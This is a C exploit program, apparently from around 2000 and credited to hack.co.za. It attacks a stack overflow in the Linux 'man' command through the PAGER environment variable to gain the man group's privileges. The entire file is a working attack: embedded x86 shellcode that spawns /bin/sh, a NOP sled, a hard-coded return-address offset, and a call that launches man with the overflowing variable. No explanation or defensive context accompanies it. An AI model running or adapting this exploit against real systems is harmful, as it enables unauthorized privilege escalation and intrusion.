/* linux x86
   exploits the stack overflow in man (PAGER env var) yielding egid man.
   
   retpos is dependent upon argv[1] to man. if you wish to change the
   manpage name, change the #define RETPOS to 3990 - strlen("manpage")
   
   anathema@hack.co.za
 */

#include <stdio.h>
#include <stdlib.h>

#define RETPOS		3987
#define OFFSET		1000

char c0de[] =
  "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0\x0b\x87\xf3\x8d"
  "\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";

int
main(int argc, char **argv)
{
  u_char buf[4096] = {0};
  u_long addr      = (u_long)&addr;
  int ret = RETPOS;

  if (argc > 1) addr += atoi(argv[1]);
  else addr += OFFSET;

  memset(buf, 0x90, ret - strlen(c0de));
  memcpy(buf + ret - strlen(c0de), c0de, strlen(c0de));

  fprintf(stderr, "addr 0x%lx\n", addr);
  buf[ret++] = (addr & 0xff);
  buf[ret++] = (addr >> 8) & 0xff;
  buf[ret++] = (addr >> 16) & 0xff;
  buf[ret++] = (addr >> 24) & 0xff;

  setenv("PAGER", buf, -1);
  execl("/usr/bin/man", "man", "cat", NULL);

  perror("execl");
}

/*                    www.hack.co.za            [2000]*/